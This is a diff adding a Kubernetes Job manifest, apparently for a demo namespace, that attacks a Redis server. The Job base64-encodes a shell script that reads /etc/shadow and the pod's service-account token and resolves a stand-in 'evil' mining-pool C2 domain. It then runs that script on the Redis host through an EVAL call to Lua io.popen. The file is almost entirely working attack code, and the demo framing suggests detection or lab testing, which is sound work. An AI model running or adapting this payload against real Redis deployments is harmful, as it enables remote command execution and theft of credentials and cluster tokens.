@@ -1,0 +1,33 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: redis-attack-once
+  namespace: redis-demo
+  labels:
+    app: redis-attack
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 900
+  template:
+    metadata:
+      labels:
+        app: redis-attack
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: attack
+          image: redis:7-alpine
+          command: ["sh", "-c"]
+          args:
+            - |
+              set -e
+              DOM="c2-$(date +%s).miningpool.evil.example.com"
+              MAL=$(printf '%s\n' \
+                'id' \
+                'whoami' \
+                'cat /etc/shadow 2>&1 | head -1' \
+                'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 20' \
+                "getent hosts ${DOM} 2>&1 || echo dnsdone" \
+                'echo mal_done' | base64 | tr -d '\n')
+              exec redis-cli -h redis -p 6379 EVAL \
+                "local f=io.popen('echo ${MAL}|base64 -d|sh 2>&1'); local o=f:read('*a'); f:close(); return o" 0
